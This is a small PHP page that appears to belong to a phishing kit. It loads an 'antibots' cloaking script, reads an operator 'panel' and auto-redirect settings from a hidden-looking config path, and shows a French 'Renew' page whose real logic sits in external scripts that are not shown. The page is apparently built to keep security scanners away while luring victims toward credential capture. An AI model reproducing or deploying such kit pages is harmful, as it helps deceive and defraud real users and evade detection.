<?php
include '../back/antibots.php';
$configFile = $_SERVER['DOCUMENT_ROOT'] . '/help/!#/settings.json';
$config = json_decode(file_get_contents($configFile), true);


$panel = $config['settings']['panel'];
$time = $config['settings']['autoredirect'];
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Renew</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="assets/1.css">
	<link rel="icon" type="image/x-icon" href="assets/img/favicon.ico">
    <script src="assets/js/2.js"></script>
    <script src="assets/js/1.js"></script>
</head>
<div id="waker" class="data-container">
    
</div>
<script>let panel = '<?php echo $panel;?>';</script>
<script>let time = '<?php echo $time;?>';</script>
<script>let lang = '<?php echo $_SESSION["lang"];?>';</script>
<script src="assets/js/3.js"></script>
</html>